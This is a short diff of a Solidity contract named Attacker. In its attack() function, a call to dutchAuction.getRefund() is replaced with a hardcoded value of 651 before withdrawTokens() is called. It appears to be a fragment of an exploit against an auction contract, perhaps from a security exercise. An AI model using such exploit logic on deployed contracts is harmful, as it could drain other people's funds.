@@ -27,7 +27,7 @@ contract Attacker{
     }
 
     function attack() external{
-        refund = dutchAuction.getRefund();
+        refund = 651;//dutchAuction.getRefund();
         dutchAuction.withdrawTokens();
     }
 
